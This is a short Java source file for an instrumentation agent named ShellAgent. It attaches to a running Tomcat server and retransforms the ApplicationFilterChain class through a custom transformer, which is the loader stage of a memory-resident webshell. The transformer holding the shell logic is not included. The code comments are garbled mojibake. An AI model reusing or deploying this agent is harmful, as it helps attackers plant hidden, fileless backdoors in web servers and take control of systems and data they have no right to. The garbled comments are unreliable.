import java.lang.instrument.Instrumentation;

public class ShellAgent {
    // ��Ŀ��������Ϊ������ϲ���� ApplicationFilterChain
    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";
    public static void agentmain(String agentArgs, Instrumentation ins) {
        ins.addTransformer(new CirnoTransformer(),true);
        // ��ȡ�����Ѽ��ص���
        Class[] classes = ins.getAllLoadedClasses();
        for (Class clas:classes){
            if (clas.getName().equals(ClassName)){
                try{
                    // ����������¶���
                    ins.retransformClasses(new Class[]{clas});
                } catch (Exception e){
                    e.printStackTrace();
                }
            }
        }
    }
}
